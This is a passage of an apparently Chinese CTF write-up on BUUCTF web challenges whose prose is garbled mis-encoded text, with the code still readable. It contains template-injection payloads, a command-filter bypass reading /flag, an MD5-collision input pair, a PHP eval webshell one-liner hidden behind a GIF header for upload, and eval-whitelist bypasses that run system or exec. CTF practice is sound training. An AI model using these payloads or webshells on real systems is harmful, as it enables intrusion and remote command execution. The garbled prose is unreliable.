<p>ä½†æ˜¯è¿™é‡Œé»‘åå•è¿‡æ»¤çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œå…¶å®è¿˜æœ‰å…¶ä»–å†…ç½®å‡½æ•°èƒ½å®ç°åŒæ ·çš„åŠŸèƒ½ï¼Œå¦‚<strong>url_for</strong>å’Œ<strong>get_flashed_messages</strong><br>å…³äºè¿™ä¸¤ä¸ªå‡½æ•°å¯ä»¥å‚è€ƒï¼š<a href="https://www.jianshu.com/p/bcf57a3092ce">https://www.jianshu.com/p/bcf57a3092ce</a></p>
<h3 id="è§£é¢˜-9"><a href="#è§£é¢˜-9" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ç›´æ¥ä¸Špayloadäº†</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>è¯»å–åˆ°flagå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web59.png" alt=""><br><code>PHP</code>ä¸­ä¹Ÿæœ‰å¾ˆå¤šæ¨¡æ¿æ¸²æŸ“çš„æ¼æ´ï¼Œä»¥åé‡åˆ°äº†æ…¢æ…¢å­¦å§ã€‚<br>é™„ä¸Šä¸€ä¸ªæ¨¡æ¿æ³¨å…¥ç‚¹æ‰«æå·¥å…·<a href="https://github.com/epinna/tplmap">tplmap</a></p>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>è€ƒå¯Ÿå¤šæ¬¡ç¼–ç ï¼Œ<code>MD5</code>å¼ºç¢°æ’</p>
<h3 id="é¢˜ç›®åˆ†æ-9"><a href="#é¢˜ç›®åˆ†æ-9" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ä¹‹åï¼Œçœ‹é¢˜ç›®çš„urlå‘ç°äº†å¯ç–‘çš„å‚æ•°<code>img</code>å’Œ<code>cmd</code>ï¼Œå¹¶ä¸”<code>img</code>çš„å€¼æ˜¯ä¸€ä¸²base64ï¼Œè§£ç ä¹‹åè¿˜æ˜¯base64ï¼Œå†è§£ç æ‹¿åˆ°ä¸€ä¸²hexç ï¼Œæœ€ç»ˆè§£ç æ˜¯<code>555.png</code>ï¼Œè¿™å°±è¯´æ˜ï¼Œè¯»å–æ–‡ä»¶çš„æ—¶å€™æ˜¯å…ˆè¿›è¡Œhexç¼–ç ï¼Œç„¶åä¸¤æ¬¡base64ç¼–ç ä¼ å‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹å°±å¯ä»¥è¯»å…¶ä»–æ–‡ä»¶äº†ã€‚<br>å…ˆçœ‹<code>index.php</code>çš„å†…å®¹ï¼Œä¸‰æ¬¡ç¼–ç ä¼ å‚ä¹‹åæ‹¿åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>preg_match(&quot;/flag/i&quot;, $file)</code>è¯´æ˜flagåœ¨<code>/flag</code>ä¸­ï¼ŒåŒæ—¶</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\`</span>|;|,|<span class="symbol">\*</span>|<span class="symbol">\?</span>|<span class="symbol">\\</span>|<span class="symbol">\\</span><span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|<span class="symbol">\\</span>$|<span class="symbol">\[</span>|<span class="symbol">\]</span>|&#123;|&#125;|<span class="symbol">\(</span>|<span class="symbol">\)</span>|-|&lt;|&gt;/i", <span class="keyword">$cmd)</span></span><br></pre></td></tr></table></figure>
<p>å¯¹<code>cmd</code>ä¼ å‚å†…å®¹è¿›è¡Œäº†å¾ˆå¤šçš„è¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°<code>cat</code>è¢«banäº†ï¼Œä½†æ˜¯å¯¹<code>\</code>ç”¨äº†<code>\\</code>æ¥è¿‡æ»¤ï¼Œä¹‹å‰æ‰“æ¯”èµ›é‡åˆ°è¿‡ï¼Œè¿™æ ·åŒ¹é…å…¶å®åŒ¹é…ä¸åˆ°<code>\</code>ï¼Œå› æ­¤å¯ä»¥å€ŸåŠ©<code>ca\t</code>æ¥ç»•è¿‡ï¼Œè¿™é‡Œå…¶å®è¿˜å¯ä»¥ç”¨<code>sort</code>å‘½ä»¤æ¥è¯»å–flagçš„ã€‚</p>
<blockquote>
<p><strong>sort</strong>ï¼šsortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚</p>
</blockquote>
<p>å…¶å®Linuxä¸­å¯¹å‘½ä»¤è¿‡æ»¤çš„ç»•è¿‡æ–¹å¼è¿˜å¾ˆå¤šï¼Œå‚è€ƒ<a href="https://www.cnblogs.com/-chenxs/p/11978488.html">è¿™é‡Œ</a></p>
<p>å¦ä¸€ä¸ªè€ƒç‚¹æ˜¯<code>MD5</code>å¼ºæ¯”è¾ƒç»•è¿‡ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯å›ºå®šç”¨æ³•ï¼š</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br><span class="line">&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure>
<p>å…¶å®åŸç†æ˜¯ç”Ÿæˆä¸¤ä¸ªtxtæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹åªæœ‰å‡ ä½ä¸åŒï¼Œä½†æœ€åçš„md5å€¼æ˜¯ç›¸åŒçš„ã€‚</p>
<h3 id="è§£é¢˜-10"><a href="#è§£é¢˜-10" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>åˆ©ç”¨<code>cmd</code>ä¼ å‚<code>sort%20/flag</code>æˆ–<code>ca\t%20/flag</code>å³å¯ï¼Œå½“ç„¶<code>c\at</code>æ•ˆæœä¸€æ ·ï¼Œè¿™ä¸linuxçš„å‘½ä»¤ç›¸å…³ï¼Œæœ€åæ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web61.png" alt=""><br><strong>å·¨å‘ï¼å¦‚æœæƒ³è¦ç”¨BPæŠ“åŒ…æ”¹POSTçš„å†…å®¹ï¼Œwebç«¯ä¸€å®šæ˜¯è¦POSTä¼ æ•°æ®ï¼Œä¸èƒ½GETä¼ å‚ä¹‹åæŠ“åŒ…å†æ”¹æˆPOSTï¼Œå¦åˆ™å¤±è´¥ï¼</strong></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>å¸¸è§„æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå¯¹åç¼€åè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸€èˆ¬ç”¨<code>php</code>ã€<code>php3</code>ã€<code>php4</code>ã€<code>php5</code>ã€<code>phtml</code>ã€<code>pht</code>æ¥ç»•è¿‡ï¼Œæœ¬é¢˜æ˜¯åˆ©ç”¨<code>pht</code>ç»•è¿‡çš„ã€‚<br>æœ¬é¢˜ä¹Ÿå¯¹<code>&lt;?</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œåˆ©ç”¨<code>GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code>å³å¯ã€‚</p>
<h3 id="è§£é¢˜-11"><a href="#è§£é¢˜-11" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä¸Šä¼ æ„é€ å¥½çš„å°é©¬ï¼ŒæŠ“åŒ…ä¹‹åæŠŠæ–‡ä»¶ç±»å‹æ”¹ä¸º<code>image/jpg</code>ä¸Šä¼ ä¹‹åå³å¯æˆåŠŸè§£æ<br><img src="http://www.ggb0n.cool/images/BUUCTF-web63.png" alt=""><br>å°é©¬å­˜åœ¨äº†<code>/upload</code>è·¯å¾„ä¸‹ï¼Œèšå‰‘è¿æ¥æ‹¿flagã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web62.png" alt=""></p>
<h2 id="CISCN-2019-Love-Math"><a href="#CISCN-2019-Love-Math" class="headerlink" title="[CISCN 2019]Love Math"></a>[CISCN 2019]Love Math</h2><p>ä¸»è¦è€ƒå¯ŸPHPåŸºæœ¬å‡½æ•°çš„åˆ©ç”¨ï¼Œè¿˜æœ‰å˜é‡ä¸å‡½æ•°å…³è”çš„çŸ¥è¯†</p>
<h3 id="è¡¥å……çŸ¥è¯†-1"><a href="#è¡¥å……çŸ¥è¯†-1" class="headerlink" title="è¡¥å……çŸ¥è¯†"></a>è¡¥å……çŸ¥è¯†</h3><p>ä¸€äº›åŸºæœ¬çš„å‡½æ•°ï¼š</p>
<blockquote>
<p><code>scandir()</code>å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br><code>base_convert()</code>å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚<br><code>dechex()</code>å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚<br><code>hex2bin()</code>å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚<br><code>var_dump()</code>å‡½æ•°:ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br><code>readfile()</code>å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å›<code>false</code>ã€‚æ‚¨å¯ä»¥é€šè¿‡<code>@readfile()</code>å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚</p>
</blockquote>
<p><strong>åŠ¨æ€å‡½æ•°</strong></p>
<blockquote>
<p>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ä¾‹å¦‚ï¼š<code>$function = &quot;sayHello&quot;;$function();</code></p>
</blockquote>
<p><strong>phpä¸­å‡½æ•°åé»˜è®¤ä¸ºå­—ç¬¦ä¸²</strong></p>
<blockquote>
<p>ä¾‹å¦‚æœ¬é¢˜ç™½åå•ä¸­çš„<code>asinh</code>å’Œ<code>pi</code>å¯ä»¥ç›´æ¥å¼‚æˆ–ï¼Œè¿™å°±å¢åŠ äº†æ„é€ å­—ç¬¦çš„é€‰æ‹©.</p>
</blockquote>
<h3 id="é¢˜ç›®åˆ†æ-10"><a href="#é¢˜ç›®åˆ†æ-10" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ‰“å¼€è¿æ¥ï¼Œç»™å‡ºäº†æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ†ææºç å¯çŸ¥ï¼Œå¯¹å‚æ•°å†…å®¹ä½œäº†ä»¥ä¸‹çš„é™åˆ¶ï¼š</p>
<ul>
<li>1ã€é•¿åº¦ä¸èƒ½è¶…è¿‡80ï¼›</li>
<li>2ã€ä¸èƒ½åŒ…å«<code></code>,<code>\t</code>,<code>\r</code>,<code>\n</code>,<code>&#39;</code>,<code>&quot;</code>,<code>åå¼•å·</code>,<code>[</code>,`]`` è¿™äº›å­—ç¬¦ï¼›</li>
<li>3ã€ä¸èƒ½æœ‰ä¸æ˜¯$whitelistç™½åå•é‡Œé¢çš„å­—ç¬¦ä¸²å‡ºç°ï¼›</li>
</ul>
<p>å•å•ä¼ å‚<code>c</code>è‚¯å®šæ˜¯ä¸è¡Œäº†ï¼Œæœ‰ä¸¤ç§æ€è·¯æ¥æ‹¿flagï¼š<br><strong>åŠ ä¸€ä¸ªå‚æ•°</strong>ï¼šæˆ‘ä»¬éœ€è¦æ„é€ ä¸ª<code>$_GET[1]</code>ï¼Œç„¶åå†æ‹¿flagï¼Œä½†æ˜¯<code>[</code>ã€<code>]</code>éƒ½ä¸èƒ½ç”¨ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æ„é€ ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç™½åå•ä¸­çš„é‚£äº›å‡½æ•°æ¥æ„é€ ã€‚<br><strong>ç›´æ¥cat flag</strong>ï¼šä¹Ÿéœ€è¦ç”¨åˆ°ä¸Šé¢è¯´çš„ä¸€äº›å‡½æ•°æ¥æ„é€ ã€‚<br>ä¸»è¦ç”¨åˆ°<code>base_convert</code>ã€<code>dechex</code>ä¸¤ä¸ªå‡½æ•°ï¼ŒåŒæ—¶å°†<code>pi</code>ã€<code>abs</code>å½“åšå‚æ•°æ¥åˆ©ç”¨ã€‚</p>
<h3 id="è§£é¢˜-12"><a href="#è§£é¢˜-12" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><h4 id="åŠ å‚æ•°"><a href="#åŠ å‚æ•°" class="headerlink" title="åŠ å‚æ•°"></a>åŠ å‚æ•°</h4><p>æ„é€ <code>&amp;_GET</code>ä¼ å‚ï¼š<br>payload 1ï¼š</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">$<span class="literal">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="literal">pi</span>=system&amp;<span class="built_in">abs</span>=cat /<span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line">$<span class="literal">pi</span>=hex2bin(<span class="string">"5f474554"</span>) =&gt; $<span class="literal">pi</span>=<span class="string">"_GET"</span>   <span class="comment">//hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;) =&gt; ($<span class="variable">_GET</span>)&#123;<span class="literal">pi</span>&#125;($<span class="variable">_GET</span>)&#123;<span class="built_in">abs</span>&#125;  <span class="comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™ç§æ–¹æ³•ä¼šæŠ¥<code>400 Bad Request</code>ï¼Œå¯èƒ½è·Ÿæ„é€ çš„<code>&amp;_GET</code>ç›¸å…³ï¼Œç½‘ä¸Šå‚è€ƒåˆ°ä¸èƒ½<code>&amp;_GET</code>ä¼ å‚ï¼Œå¯ä»¥ç”¨<code>header</code>æ¥ä¼ ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ï¼š<br>payload 2</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//æ“ä½œxxå’Œyyï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼Œechoéƒ½èƒ½è¾“å‡º</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
